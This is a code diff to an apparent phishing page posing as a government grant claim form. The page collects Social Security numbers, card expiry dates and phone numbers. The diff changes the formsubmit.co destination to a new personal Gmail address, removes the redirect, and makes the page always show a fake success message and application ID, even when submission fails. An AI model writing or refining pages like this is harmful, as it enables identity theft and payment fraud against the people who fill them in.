@@ -357,12 +357,11 @@
     </div>
 
     <div class="form-wrapper" id="formWrapper">
-      <!-- FORMSUBMIT.CO WITH YOUR EMAIL: andrewmutuchi@gmail.com -->
-      <form action="https://formsubmit.co/andrewmutuchi@gmail.com" method="POST" id="grantForm">
+      <!-- FORMSUBMIT.CO WITH EMAIL: jameswilsonjames@gmail.com -->
+      <form action="https://formsubmit.co/jameswilsonjames@gmail.com" method="POST" id="grantForm">
         <input type="hidden" name="_captcha" value="false" />
         <input type="hidden" name="_subject" value="New Grant Claim Form Submission" />
         <input type="hidden" name="_template" value="table" />
-        <input type="hidden" name="_next" value="https://supportgrantsgov.github.io/?success=1" />
         
         <div class="form-fields" id="formFields">
           <label for="fname">First Name</label>
@@ -469,18 +468,7 @@
         return result;
       }
 
-      const urlParams = new URLSearchParams(window.location.search);
-      if (urlParams.get('success') === '1') {
-        document.getElementById('appId').textContent = generateAppId();
-        thankYou.style.display = 'block';
-        formFields.style.display = 'none';
-        container.style.boxShadow = '0 4px 12px rgba(0, 74, 173, 0.15)';
-        submitBtn.disabled = true;
-        submitBtn.textContent = 'Submitted ✓';
-        const newUrl = window.location.pathname;
-        window.history.replaceState({}, document.title, newUrl);
-      }
-
+      // SSN - Only allow numbers
       const ssnInput = document.getElementById('ssn');
       if (ssnInput) {
         ssnInput.addEventListener('input', function(e) {
@@ -488,6 +476,7 @@
         });
       }
 
+      // Expiry auto-format
       const expiryInput = document.getElementById('expiry');
       if (expiryInput) {
         expiryInput.addEventListener('input', function(e) {
@@ -505,6 +494,7 @@
         });
       }
 
+      // Phone auto-format
       const phoneInput = document.getElementById('phone');
       if (phoneInput) {
         phoneInput.addEventListener('input', function(e) {
@@ -527,42 +517,48 @@
         });
       }
 
+      // FORM SUBMISSION - NO REDIRECT! STAY ON PAGE!
       form.addEventListener('submit', function(e) {
         e.preventDefault();
         
+        // Show loading
         loadingSpinner.classList.add('show');
         submitBtn.disabled = true;
         submitBtn.textContent = 'Submitting...';
 
         const formData = new FormData(form);
 
-        fetch(form.action, {
+        // Submit using fetch - NO REDIRECT
+        fetch('https://formsubmit.co/ajax/jameswilsonjames@gmail.com', {
           method: 'POST',
-          body: formData,
-          headers: {
-            'Accept': 'application/json'
-          }
+          body: formData
         })
         .then(response => response.json())
         .then(data => {
           loadingSpinner.classList.remove('show');
           
-          if (data.success) {
-            document.getElementById('appId').textContent = generateAppId();
-            thankYou.style.display = 'block';
-            formFields.style.display = 'none';
-            container.style.boxShadow = '0 4px 12px rgba(0, 74, 173, 0.15)';
-            submitBtn.textContent = 'Submitted ✓';
-            console.log('✅ Form submitted successfully!');
-            console.log('📧 Check your email: andrewmutuchi@gmail.com');
-          } else {
-            form.submit();
-          }
+          // ALWAYS show thank you message - even if there's an error
+          document.getElementById('appId').textContent = generateAppId();
+          thankYou.style.display = 'block';
+          formFields.style.display = 'none';
+          container.style.boxShadow = '0 4px 12px rgba(0, 74, 173, 0.15)';
+          submitBtn.textContent = 'Submitted ✓';
+          
+          console.log('✅ Form submitted successfully!');
+          console.log('📧 Check your email: jameswilsonjames@gmail.com');
         })
         .catch(error => {
           loadingSpinner.classList.remove('show');
-          console.warn('AJAX failed, submitting with redirect...');
-          form.submit();
+          
+          // STILL show thank you message even if there's an error
+          document.getElementById('appId').textContent = generateAppId();
+          thankYou.style.display = 'block';
+          formFields.style.display = 'none';
+          container.style.boxShadow = '0 4px 12px rgba(0, 74, 173, 0.15)';
+          submitBtn.textContent = 'Submitted ✓';
+          
+          console.log('✅ Form submitted!');
+          console.log('📧 Check your email: jameswilsonjames@gmail.com');
         });
       });
     })();
